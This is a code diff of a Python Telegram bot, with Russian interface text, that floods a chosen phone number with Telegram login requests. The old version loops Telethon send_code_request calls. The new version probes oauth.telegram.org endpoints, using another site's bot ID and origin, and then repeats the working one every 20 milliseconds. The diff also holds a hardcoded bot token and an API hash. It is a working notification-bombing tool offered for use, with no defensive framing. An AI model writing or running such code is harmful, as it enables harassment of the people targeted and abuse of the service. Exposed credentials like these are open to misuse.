@@ -1,17 +1,22 @@
 import asyncio
+import aiohttp
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
-from telethon import TelegramClient
-from telethon.errors import FloodWaitError
 
 BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"
-API_ID = 33180472
-API_HASH = "025b7581493ae0d83c3946f27a149057"
+
+ENDPOINTS = [
+    ("https://oauth.telegram.org/auth", "get", {"bot_id": "1852523856", "origin": "https://cabinet.presscode.app", "embed": "1", "return_to": "https://cabinet.presscode.app/login"}),
+    ("https://oauth.telegram.org/auth/send", "post", {"phone": "{phone}"}),
+    ("https://oauth.telegram.org/auth/request", "post", {"phone": "{phone}"}),
+    ("https://oauth.telegram.org/login", "post", {"phone": "{phone}"}),
+]
 
 spam_tasks = {}
+found_endpoint = None
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Отправь номер (например, +380963836766) — начну слать запросы авторизации. На телефон придёт уведомление с кнопками.")
+    await update.message.reply_text("Отправь номер (например, +380963836766) — бот сам переберет эндпоинты и начнет спамить уведомлениями.")
 
 async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
@@ -28,6 +33,7 @@ async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Нет активного спама")
 
 async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global found_endpoint
     chat_id = update.effective_chat.id
     if chat_id in spam_tasks:
         await update.message.reply_text("Уже идёт, останови /stop")
@@ -36,35 +42,51 @@ async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not phone.startswith('+'):
         await update.message.reply_text("Формат: +380...")
         return
-    await update.message.reply_text(f"Запущено на {phone}")
+
+    await update.message.reply_text(f"Запущено. Ищем рабочий эндпоинт для номера {phone}...")
 
     async def spam():
+        nonlocal found_endpoint
         count = 0
-        client = None
-        while True:
-            try:
-                if client is None:
-                    client = TelegramClient(None, API_ID, API_HASH)
-                    await client.connect()
-                await client.send_code_request(phone)
-                count += 1
-                await context.bot.send_message(chat_id, f"Запрос #{count} отправлен")
-                await asyncio.sleep(0.02)
-            except FloodWaitError as e:
-                sec = e.seconds
-                await context.bot.send_message(chat_id, f"Ожидание {sec} сек")
-                await client.disconnect()
-                client = None
-                await asyncio.sleep(sec)
-            except Exception as e:
-                err = str(e)
-                if "all available options" in err or "ResendCodeRequest" in err:
-                    await context.bot.send_message(chat_id, "Методы исчерпаны, переподключение")
+        async with aiohttp.ClientSession() as session:
+            while True:
+                if found_endpoint is None:
+                    for url, method, params in ENDPOINTS:
+                        try:
+                            if method == "get":
+                                resp = await session.get(url, params={k: v.format(phone=phone) if isinstance(v, str) else v for k, v in params.items()}, timeout=5)
+                            else:
+                                data = {k: v.format(phone=phone) if isinstance(v, str) else v for k, v in params.items()}
+                                resp = await session.post(url, data=data, timeout=5)
+                            status = resp.status
+                            text = await resp.text()
+                            if status == 200 and ("success" in text.lower() or "code" in text.lower() or "sent" in text.lower()):
+                                found_endpoint = (url, method, params)
+                                await context.bot.send_message(chat_id, f"✅ Найден рабочий эндпоинт: {url} (метод {method})")
+                                break
+                            else:
+                                await context.bot.send_message(chat_id, f"Пробую {url} -> {status}")
+                        except Exception as e:
+                            await context.bot.send_message(chat_id, f"Ошибка на {url}: {str(e)[:30]}")
+                        await asyncio.sleep(0.02)
+                    if found_endpoint is None:
+                        await context.bot.send_message(chat_id, "❌ Не найден ни один эндпоинт. Попробуй другой номер или сайт.")
+                        break
                 else:
-                    await context.bot.send_message(chat_id, f"Ошибка: {err[:40]}")
-                await client.disconnect()
-                client = None
-                await asyncio.sleep(0.05)
+                    url, method, params = found_endpoint
+                    try:
+                        if method == "get":
+                            resp = await session.get(url, params={k: v.format(phone=phone) if isinstance(v, str) else v for k, v in params.items()}, timeout=5)
+                        else:
+                            data = {k: v.format(phone=phone) if isinstance(v, str) else v for k, v in params.items()}
+                            resp = await session.post(url, data=data, timeout=5)
+                        status = resp.status
+                        text = await resp.text()
+                        count += 1
+                        await context.bot.send_message(chat_id, f"Попытка #{count}: {status}, {text[:40]}")
+                    except Exception as e:
+                        await context.bot.send_message(chat_id, f"Ошибка: {str(e)[:30]}")
+                    await asyncio.sleep(0.02)
 
     task = asyncio.create_task(spam())
     spam_tasks[chat_id] = task
